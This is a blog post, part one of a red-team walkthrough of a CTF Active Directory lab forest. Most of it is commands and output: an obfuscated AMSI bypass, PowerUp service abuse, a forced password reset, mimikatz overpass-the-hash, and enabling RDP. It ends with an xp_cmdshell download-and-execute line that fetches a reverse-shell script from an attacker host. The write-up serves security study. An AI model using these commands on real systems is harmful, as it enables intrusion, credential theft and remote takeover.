---
title: "cosmos, part 1: red-teaming corporate AD environments"
date: 2024-09-19T10:56:20-04:00
draft: false
type: "post"
---

corporate networks face a constant and ever-evolving array of threats. at the heart of many enterprise IT infrastructures lies Active Directory [AD]. this is a directory service developed by Microsoft that provides authentication (AuthC) and authorization (AuthZ) services. AD is ubiquitous because of its robust capabilities in managing users, groups, computers, and access to resources across large-scale networks.

this also makes it a prime target for attackers. a successful attack on an org's AD can lead to data breaches, intellectual property theft, or complete takeover of the corporate infrastructure.

red-teaming involves simulating real-world attacks on an org's systems + networks. for AD environments, this means compromising user accounts, escalating privileges, moving laterally through the network, and ultimately gaining control over domain controllers. by emulating TTPs of actual threat actors, red-teaming helps orgs identify vulnerabilities, test detection + response, and strengthen their security posture.

corporate AD environments are typically set up in a hierarchical structure, often spanning multiple domains and forests to reflect the org-structure of the business. this complexity, while necessary for large enterprises, can introduce vulnerabilities if not properly managed. misconfigurations, overly permissive settings, or failures to follow principles of least privilege can create opportunities for attackers to exploit. 

the real kicker is that because AD has an interconnected nature, a compromise in one part of the network can potentially lead to a full domain (or even forest) takeover. 

# scenario

the scenario here focuses on an on-prem AD environment. many organizations are now moving towards a fully cloud-based (or hybrid) environment, but on-prem AD remains prevalent in numerous enterprises due to regulatory requirements, legacy system dependencies, or specific business needs.

how would an attacker in this scenario gain their initial foothold? there are several ways in:

**phishing attacks**: tricking employees into revealing credentials or executing malware.

**social engineering**: manipulating employees to divulge sensitive information.

**exploiting external services**: leveraging vulnerabilities in web apps, VPNs, or other services exposed to the internet.

**purchasing stolen credentials**: gg ez.

in this CTF, everyone already starts with access to a user account, thereby circumventing the initial breach step. this means i can focus solely on the post-exploitation phase: escalate privileges and move laterally.

the attack chain demonstrates how a minor foothold can be leveraged to compromise an entire AD forest. hopefully, by sharing and understanding these attack paths, the security community can learn to better defend against them.

# the forest

the target environment is set up as an AD forest named `Cosmos.Local`. a forest is the highest level of organization in AD and can contain one or more domains.

in this case, we have two domains:

**`Cosmos.Local`**: the parent domain.

**`Nebula.Cosmos.Local`**: the child domain.

these domains are connected by a two-way trust relationship, also known as a "parent-child trust". what this means is that the users from one domain can be granted access to resources in the other domain, and vice versa. these trust relationships are common in large orgs where different departments or subsidiaries need their own AD domains but still require a level of integration.

## the machines

### `User.Nebula.Cosmos.Local`
**role**: end-user workstation (typical employee computer). initial point of entry which simulates a compromised user account.

**domain**: `Nebula.Cosmos.Local`

### `Uatsrv.Nebula.Cosmos.Local`
**role**: UAT (User Acceptance Testing) Server. used for testing apps before they go into production. often has elevated privileges and looser security controls.

**domain**: `Nebula.Cosmos.Local`

### `Devsrv.Nebula.Cosmos.Local`
**role**: development server. hosts dev environments + tools. may contain valuable source code and often has connections to other critical systems.

**domain**: `Nebula.Cosmos.Local`

### `Prodsrv.Nebula.Cosmos.Local`
**role**: production server. runs live business apps. critical asset with access to real data and often stringent security measures.

**domain**: `Nebula.Cosmos.Local`

### `Nebula-DC.Nebula.Cosmos.Local`
**role**: DC for `Nebula.Cosmos.Local`. manages AuthC + AuthZ for the Nebula child domain. prime target for attackers looking to control the entire child domain.

**domain**: `Nebula.Cosmos.Local`

### `Cosmos-DC.Cosmos.Local`
**role**: DC for `Cosmos.Local` [Forest Root]. this is the ultimate target. as the forest root domain controller, it has authority over all domains in the forest. **compromising this grants control over the entire AD infrastructure.**

## attack path

gain a foothold on the user workstation.

then, move laterally to the UAT and Dev servers, exploiting their looser security.

next, leverage access to compromise the production server.

abuse the production server's privileges to attack the `Nebula` domain controller.

finally, exploit the trust relationship to compromise the `Cosmos` domain controller and the entire forest.

# target 1: the foothold

the seemingly innocuous user workstation is the entry point into the network. in a typical enterprise environment, these workstations are the most numerous and often considered low-hanging fruit for attackers. employees use them for daily tasks and so they're often less strictly controlled than servers.

the challenge is to elevate privileges and gather crucial information about the domain structure...without raising any alarms. 

another thing about workstations: they often have vulnerabilities, outdated software, and misconfigurations. they can also be treasure troves of information, like cached credentials.

## initial access + privilege escalation

first, let's disable AMSI (Antimalware Scan Interface). AMSI is designed to prevent malicious scripts from running, so i'll have to write an obfuscated command to evade detection by signature-based security tools.

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

now i can run my own tools without interference.

next, let's change the execution policy.

```powershell
Powershell -ep bypass
```

this launches PowerShell with the execution policy set to `bypass`. the execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files + runs scripts. by bypassing it, scripts can be run without restrictions.

i then used `PowerUp` to find vectors of privilege escalation. using it along with `Invoke-AllChecks` runs a series of checks to identify vectors like misconfigurations, vulnerable services, or unquoted service paths.

```powershell
.\PowerUp.ps1
Invoke-AllChecks
```

i get back an interesting piece of information.

```powershell
ServiceName : vds
Path : C:\Windows\System32\vds.exe
StartName : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'vds'
CanRestart : True
```

let's exploit this vulnerable service `VDS` to add our user `bilal` to the local Administrators group.

```powershell
Invoke-ServiceAbuse -ServiceName vds -UserName Nebula\bilal
```

this exploits a vulnerability in `VDS` (Virtual Disk Service). it modifies the service to run a command [`net localgroup Administrators Nebula\bilal /add`] that will add my user to the Administrators group. this works because `VDS` runs with `SYSTEM` privileges. 

logging back in so the changes take effect, i can verify:

```powershell
net localgroup Administrators

--------------------------------------
Administrator
Nebula\Domain Admins
Nebula\bilal
```

## enumeration

get the list of domain users.

```powershell
Get-NetUser | select samaccountname
```

get the list of domain computers.

```powershell
Get-netcomputer
```

get the list of domain groups.

```powershell
Get-netgroup

Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
System Managed Accounts Group
Storage Replica Administrators
Domain Computers
Domain Controllers
Cert Publishers
Domain Admins
Domain Users
Domain Guests
Group Policy Creator Owners
RAS and IAS Servers
Server Operators
Account Operators
Pre-Windows 2000 Compatible Access
Windows Authorization Access Group
Terminal Server License Servers
Allowed RODC Password Replication Group
Denied RODC Password Replication Group
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
DnsAdmins
DnsUpdateProxy
SQLManagers
```

check domain trusts.

```powershell
Get-NetDomainTrust

SourceName               TargetName    TrustType     TrustDirection
-----------              -----------   ----------    ---------------
Nebula.Cosmos.Local      Cosmos.Local  ParentChild   Bidirectional
```

before moving on, it's important to run `nslookup` on each machine in the environment to collect their IP addresses. it's also helpful to map out a graphical representation of the AD relationships, using BloodHound.

```powershell
PS C:\ad\tools> cd .\BloodHound-master\BloodHound-master\
PS C:\ad\tools\BloodHound-master\BloodHound-master> cd .\Ingestors\
PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> . .\SharpHound.ps1
PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> Invoke-BloodHound -CollectionMethod All
Initializing SharpHound at 10:49 PM on 7/3/2024

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
[+] Creating Schema map for domain NEBULA.COSMOS.LOCAL using path CN=Schema,CN=Configuration,DC=NEBULA,DC=COSMOS,DC=LOCAL
PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> Invoke-BloodHound -CollectionMethod LoggedOn

Initializing SharpHound at 10:49 PM on 7/3/2024

Status: 68 objects finished (+68 68)/s -- Using 103 MB RAM
Resolved Collection Methods: LoggedOn451
Compressing data to C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors\20210703224909_BloodHound.zip
[+] Creating Schema map for domain NEBULA.COSMOS.LOCAL using path CN=Schema,CN=Configuration,DC=NEBULA,DC=COSMOS,DC=LOCAL
PS C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors> [!] Cache File Found! Loaded 119 Objects in cache
SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 104 MB RAM
Status: 5 objects finished (+5 ∞)/s -- Using 105 MB RAM
Enumeration finished in 00:00:00.1406833
Compressing data to C:\ad\tools\BloodHound-master\BloodHound-master\Ingestors\20210703224919_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 10:49 PM on 7/3/2024! Happy Graphing!
```

the `All` collection method would gather comprehensive data about the domain, while the `LoggedOn` method focuses on currently active sessions. 

# target 2: leveraging password resets

this machine represents a typical UAT server in an enterprise environment. UAT servers are used to test apps in an environment that closely mimic production, allowing users to verify that the software meets requirements before going live.

these servers often have looser security controls (compared to production systems). the challenge here is to exploit the delicate balance between functionality + security that UAT environments often struggle with.

it's clear that UAT servers are critical in the SDLC, but they're often overlooked from a security perspective. they may have elevated privileges to simulate various user roles, and their configurations might be less stringent to facilitate testing. this makes them valuable stepping stones for an attacker moving through a network.

earlier, running BloodHound revealed that the `bilal` user could force a password change for the `UATADMIN` user. let's exploit this using PowerView.

```powershell
PS C:\ad\tools> Set-DomainUserPassword -Identity UATADMIN -Verbose
cmdlet Set-DomainUserPassword at command pipeline position 1
Supply values for the following parameters:
AccountPassword: ********
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'UATADMIN'
VERBOSE: [Set-DomainUserPassword] Password for user 'UATADMIN' successfully reset
```

this PowerView command allows me to forcibly change the password of another user's account. usually, this ability rests with IT for support purposes but can be a significant risk if not properly controlled. by changing the password, i can gain access to a more privileged account.

using mimikatz, i can perform an overpass-the-hash attack. this is when an attacker isn't able to access the cleartext password of a target, but can acquire a Kerberos ticket armed with just the NTLM hash of the password.

```powershell
PS C:\ad\tools> Invoke-Mimikatz -Command "sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe"

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::pth /user:uatadmin /domain:nebula.cosmos.local /ntlm:271B74BE505CD48CEF768D0D973E59E7 /run:powershell.exe
user    : uatadmin
domain  : garrison.castle.local
program : powershell.exe
impers. : no
NTLM    : 271b74be505cd48cef768d0d973e59e7
  |  PID  4428
  |  TID  1292
  |  LSA Process is now R/W
  |  LUID 0 ; 1820938 (00000000:001bc90a)
  \_ msv1_0   - data copy @ 0000026480392C00 : OK !
  \_ kerberos - data copy @ 0000026480082500
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000026481000000 (32) -> null
```

using the NTLM hash instead of the password to authenticate launches a new PowerShell process that runs with the `UATADMIN` credentials. 

i can then add `bilal` to the local Administrators group on both the `UATADMIN` and `UATSRV` machines. 

```powershell
PS C:\Windows\system32> $sess = New-PSSession -ComputerName uatsrv.nebula.cosmos.local 
PS C:\Windows\system32> Enter-PSSession -Session $sess [uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> net localgroup administrators /add nebula\bilal 

The command completed successfully.
```

finally, let's enable RDP on the machine. i'll modify the Windows Registry to allow RDP connections, then enable the necessary firewall rule. this will give me GUI access to the machine, which could come in handy for further exploitation + exfiltration.

```powershell
[uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> whoami;hostname nebula\uatadmin
uatsrv 
[uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
[uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
[uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow 
Ok.

[uatsrv.nebula.cosmos.local]: PS C:\Users\uatadmin\Documents> Test-NetConnection 172.16.10.1 -CommonTCPPort rdp
```

# target 3: sql server exploitation

this is a dev server that hosts critical database services. dev servers are used by engineers to build + test apps before moving them to production.

these environments usually contain valuable intellectual property (code) and have direct connections to production systems. let's look for more information the SQL Server setup. you can do this with `PowerUpSQL.ps1`.

```powershell
PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

VERBOSE: Creating runspace pool and session states

VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.

VERBOSE: USER : Connection Failed.

VERBOSE: Closing the runspace pool

  

ComputerName                    Instance                         Status

------------                    --------                         ------

devsrv.nebula.cosmos.local      devsrv.nebula.cosmos.local,1433  Accessible

USER                             USER                            Not Accessible
```

```powershell
PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.

  

ComputerName : devsrv.nebula.cosmos.local

Instance : DEVSRV

DomainName : GARRISON

ServiceProcessID : 2576

ServiceName : MSSQLSERVER

ServiceAccount : GARRISON\devsqladmin

AuthenticationMode : Windows and SQL Server Authentication

ForcedEncryption : 0

Clustered : No

SQLServerVersionNumber : 14.0.1000.169

SQLServerMajorVersion : 2017

SQLServerEdition : Developer Edition (64-bit)

SQLServerServicePack : RTM

OSArchitecture : X64

OsMachineType : ServerNT

OSVersionName : Windows Server 2016 Standard

OsVersionNumber : SQL

CurrentLogin : nebula\uatadmin

IsSysadmin : Yes

ActiveSessions : 1

  

PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose

VERBOSE: devsrv.nebula.cosmos.local : Connection Success.

VERBOSE: devsrv.nebula.cosmos.local : Connection Success.

VERBOSE: ------------------------------------------

VERBOSE: Server: DEVSRV

VERBOSE: ------------------------------------------

VERBOSE: - Link Path to server: DEVSRV
```

luckily for me, i have sysadmin rights on this instance. meaning i can run OS commands, like `whoami` on the machine. 

```powershell
PS C:\ad\tools\PowerUpSQL-master\PowerUpSQL-master> Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami

  

ComputerName                 Instance                    CommandResults

------------                   --------                    ---------

devsrv.nebula.cosmos.local   devsrv.nebula.cosmos.local  nebula\devsqladmin
```


i'm now going to build a backdoor into this instance. to do this, i'll set up a PowerCat listener and use a PowerShell reverse shell script.

```powershell
Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1'')"'

Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command "powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1')"

ComputerName Instance CommandResults

------------ -------- --------------

devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local


PS C:\ad\tools> powercat -l -v -p 443 -t 555555

VERBOSE: Set Stream 1: TCP

VERBOSE: Set Stream 2: Console

VERBOSE: Setting up Stream 1...

VERBOSE: Listening on [0.0.0.0] (port 443)

VERBOSE: Connection from [172.16.3.31] port [tcp] accepted (source port 49718)

VERBOSE: Setting up Stream 2...

VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...

Windows PowerShell running as user devsqladmin on DEVSRV

Copyright (C) 2015 Microsoft Corporation. All rights reserved.

  

PS C:\Windows\system32>

  

PS C:\Windows\system32> PS C:\Windows\system32>

PS C:\Windows\system32> whoami

nebula\devsqladmin

PS C:\Windows\system32>
```

the entire process is as follows:

exploit the SQL Server links to access other linked SQL Servers.

execute `xp_cmdshell`, which will allow me to execute OS commands.

download + execute a reverse shell script that will give me a reverse shell on `DEVSRV` as the `DEVSQLADMIN` user. 


stay tuned for part 2, where i takeover the production server and domain controllers!